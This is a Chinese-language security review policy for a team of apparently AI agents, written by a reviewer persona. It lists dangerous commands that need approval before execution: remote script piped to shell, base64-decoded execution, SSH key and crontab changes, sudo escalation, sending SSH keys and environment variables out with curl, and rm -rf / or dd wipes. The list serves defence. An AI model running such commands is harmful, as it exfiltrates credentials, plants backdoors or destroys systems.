# 🐱 平安喵安全审查规则 v1.0

> 制定者：平安喵（ping-an-miao），安全审查官
> 日期：2026-03-28

---

## 核心原则：高危命令先审后跑

**所有团队成员在执行以下类型命令前，必须先将完整命令发送给平安喵审查。**

---

## 一、必须审查的高危命令类型

### 1. 管道安装类（最高风险）
```
curl <url> | sh
curl <url> | bash
wget <url> | bash
wget -O- <url> | sh
```
风险：远端脚本内容不可见，可能包含恶意代码。

### 2. 代码混淆/动态执行类
```
eval $(...)
eval `...`
base64 -d ... | bash
echo "..." | base64 -d | sh
```
风险：隐藏真实执行内容，绕过人工检查。

### 3. SSH 密钥/配置操作
```
~/.ssh/ 目录下的任何写操作
ssh-keygen（添加新密钥）
authorized_keys 修改
known_hosts 修改（可疑场景）
```
风险：可能泄露私钥或植入后门公钥。

### 4. Crontab 修改
```
crontab -e
crontab -r
echo "..." >> /var/spool/cron/...
```
风险：植入持久化后门任务。

### 5. sudo 提权操作
```
sudo <任何非常规命令>
sudo -i / sudo su
sudo chmod 777 / sudo chown
visudo 修改
```
风险：权限提升，影响系统安全边界。

### 6. 密钥/凭证外传
```
curl -d "$(cat ~/.ssh/id_rsa)" <外部URL>
env | curl -d @- <外部URL>
任何将本地敏感文件发送到外部服务器的操作
```
风险：直接导致凭证泄露。

### 7. 危险的文件操作
```
rm -rf / 或 rm -rf /*
chmod -R 777 /
dd if=... of=/dev/sda
```
风险：不可逆的系统破坏。

## 二、审查流程

```
其他猫猫                    平安喵
   |                          |
   |-- 发送完整命令到 inbox -->|
   |                          |-- 分析命令
   |                          |-- 检查风险点
   |<-- 返回审查结论 ----------|
   |                          |
   |（可执行）直接运行          |
   |（需改）修改后重新提交      |
   |（拒绝）不得执行            |
```

### 发送审查请求命令：
```bash
clawteam inbox send 猫猫拯救世界2.0 ping-an-miao "审查请求：<完整命令>\n来源：<你的ID>\n用途：<简述目的>"
```

---

## 三、审查结论格式

平安喵将回复以下格式之一：

**✅ 可执行**
> 命令安全，可以直接运行。
> 注意事项：[如有]

**⚠️ 需改**
> 存在风险：[具体风险描述]
> 建议修改：[安全替代方案]

**❌ 拒绝**
> 高危操作，禁止执行。
> 原因：[详细说明]

---

## 四、豁免情形

以下情况可跳过审查（但仍需记录）：
- 读操作（cat、ls、grep 等，无写权限）
- 本地构建命令（npm install、pip install，来自可信 lockfile）
- git 操作（fetch、pull、push，非 force）
- 团队已审查过的幂等脚本（有 hash 记录）

---

## 五、免责声明

本审查为**流程级审查**，不能替代：
- 系统级杀毒扫描
- 网络层防火墙
- 操作系统权限控制

最终执行风险由执行者与用户共同承担。
